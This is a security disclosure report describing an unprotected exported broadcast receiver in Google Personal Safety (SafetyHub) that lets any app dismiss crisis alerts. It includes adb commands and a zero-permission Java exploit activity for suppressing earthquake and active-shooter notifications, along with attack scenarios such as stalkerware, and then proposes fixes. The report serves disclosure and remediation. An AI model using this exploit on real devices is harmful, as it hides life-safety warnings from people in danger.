# VRP Report #35: SafetyHub Crisis Notification Dismissal via Unprotected Broadcast Receiver

## Summary
The `CrisisNotificationBroadcastReceiver_Receiver` in Google Personal Safety (SafetyHub) is exported without any permission restriction. A zero-permission malicious app can silently dismiss safety-critical crisis alert notifications (earthquakes, tsunamis, active shooter alerts, severe weather warnings) by sending a broadcast with `ACTION_DISMISS_NOTIFICATION` and a crisis ID. The same receiver also allows triggering crisis notification nudge workers that can cause user confusion.

## Affected Component
- **App**: Google Personal Safety (`com.google.android.apps.safetyhub`)
- **Component**: `com.google.android.apps.safetyhub.crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver`
- **Type**: BroadcastReceiver
- **Exported**: true (AndroidManifest.xml line 451)
- **Permission**: NONE
- **Handler class**: `defpackage/iem.java`

## Vulnerability Details

### Manifest Declaration
```xml
<receiver
    android:name=".crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.safetyhub.nudge_crisis"/>
        <action android:name="com.google.android.apps.safetyhub.crisis.ACTION_DISMISS_NOTIFICATION"/>
    </intent-filter>
</receiver>
```

No `android:permission` attribute — any app can send broadcasts to this receiver.

### Handler Code (iem.java)

**Dismiss action** (iem.java lines 21-29):
```java
if (action.equals("com.google.android.apps.safetyhub.crisis.ACTION_DISMISS_NOTIFICATION")) {
    rvo rvoVarA = rvs.a(ieq.class);
    rvoVarA.h(new rvr("CrisisNotificationDismissWorker", 1));
    ejo ejoVar = new ejo((short[]) null);
    ejoVar.m("extra.crisis.id", intent.getStringExtra("extra.crisis.id"));
    ejoVar.n("extra.crisis.notif.post.timestamp.ms",
        intent.getLongExtra("extra.crisis.notif.post.timestamp.ms", 0L));
    rvoVarA.f = ejoVar.j();
    return tbf.X(rrpVar.e(rvoVarA.a()), ...);
}
```

The dismiss handler:
1. Reads `extra.crisis.id` (String) from the broadcast intent — no validation
2. Reads `extra.crisis.notif.post.timestamp.ms` (long) from the intent — no validation
3. Schedules `CrisisNotificationDismissWorker` with these attacker-controlled values
4. NO caller permission check, NO signature verification, NO origin validation

**Nudge action** (iem.java lines 31-35):
```java
if (action.equals("com.google.android.apps.safetyhub.nudge_crisis")) {
    rvo rvoVarA2 = rvs.a(ifa.class);
    rvoVarA2.h(new rvr("CrisisNotificationNudgeWorker", 1));
    return tbf.X(rrpVar2.e(rvoVarA2.a()), ...);
}
```

The nudge handler schedules `CrisisNotificationNudgeWorker` without any caller validation.

## Proof of Concept

### Via ADB (for testing):
```bash
# Dismiss a crisis notification
adb shell am broadcast \
  -n com.google.android.apps.safetyhub/.crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver \
  -a com.google.android.apps.safetyhub.crisis.ACTION_DISMISS_NOTIFICATION \
  --es extra.crisis.id "earthquake_alert_2024" \
  --el extra.crisis.notif.post.timestamp.ms 0

# Trigger crisis notification nudge
adb shell am broadcast \
  -n com.google.android.apps.safetyhub/.crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver \
  -a com.google.android.apps.safetyhub.nudge_crisis
```

### Via malicious app (zero permissions):
```java
public class CrisisDismissExploit extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Dismiss crisis notification — no permissions required
        Intent dismiss = new Intent("com.google.android.apps.safetyhub.crisis.ACTION_DISMISS_NOTIFICATION");
        dismiss.setComponent(new ComponentName(
            "com.google.android.apps.safetyhub",
            "com.google.android.apps.safetyhub.crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver"
        ));
        dismiss.putExtra("extra.crisis.id", "target_crisis_id");
        dismiss.putExtra("extra.crisis.notif.post.timestamp.ms", 0L);
        sendBroadcast(dismiss);
        
        // Trigger nudge worker
        Intent nudge = new Intent("com.google.android.apps.safetyhub.nudge_crisis");
        nudge.setComponent(new ComponentName(
            "com.google.android.apps.safetyhub",
            "com.google.android.apps.safetyhub.crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver"
        ));
        sendBroadcast(nudge);
    }
}
```

## Impact

### Crisis Notification Dismissal (HIGH)
- A zero-permission malicious app can silently dismiss safety-critical notifications
- Affected notification types: earthquake alerts, tsunami warnings, active shooter alerts, severe weather warnings, flood warnings, and other government-issued emergency alerts that SafetyHub displays
- The user receives NO indication that the notification was dismissed by a third party
- If the crisis ID format is predictable (e.g., based on event type + region + timestamp), an attacker can pre-emptively dismiss notifications as they arrive
- **Direct impact on user physical safety**: Missing an earthquake early warning or active shooter alert can be life-threatening

### Crisis Nudge Trigger (MEDIUM)
- A malicious app can trigger crisis notification nudge workers
- This can cause notification fatigue, confusing the user about real vs. fake crisis alerts
- Repeated triggering could train users to ignore legitimate crisis notifications (the "cry wolf" effect)

### Attack Scenarios
1. **Targeted suppression**: Malware installed on a victim's phone silently dismisses all crisis notifications, leaving the victim unaware of emergency situations
2. **Stalkerware integration**: A stalker app that suppresses emergency alerts to prevent the victim from receiving safety information
3. **Broad impact**: A widely distributed app that silently suppresses crisis alerts for all users

## Severity Assessment
- **Confidentiality**: Low (no data leaked)
- **Integrity**: HIGH (crisis notification state can be modified without authorization)
- **Availability**: HIGH (safety-critical notifications can be suppressed)
- **User Interaction**: NONE (fully automated, zero-click)
- **Permissions Required**: NONE (zero permissions)
- **Attack Complexity**: LOW

## Fix Recommendation

### Option 1: Add permission restriction (recommended)
```xml
<receiver
    android:name=".crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver"
    android:exported="true"
    android:permission="com.google.android.apps.safetyhub.permission.CRISIS_NOTIFICATION">
```
Define the permission with `signature` protectionLevel.

### Option 2: Use unexported receiver with PendingIntents
Make the receiver `exported=false` and use PendingIntents in the notification actions:
```xml
<receiver
    android:name=".crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver"
    android:exported="false">
```

### Option 3: Add caller verification in handler code
```java
// In iem.b(Intent):
if (!GoogleSignatureVerifier.getInstance().isGooglePackage(context, callingPackage)) {
    throw new SecurityException("Unauthorized caller");
}
```

## Additional Finding: EmergencyContactsEndpointService (exported, no permission)

The `EmergencyContactsEndpointService` is also exported without any manifest permission:
```xml
<service
    android:name=".emergencycontacts.server.EmergencyContactsEndpointService"
    android:enabled="true"
    android:exported="true"
    android:directBootAware="true"/>
```

A malicious app could bind to this service and potentially read or modify emergency contact data. This should also be restricted with a signature-level permission.

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- Google Personal Safety (com.google.android.apps.safetyhub) as bundled
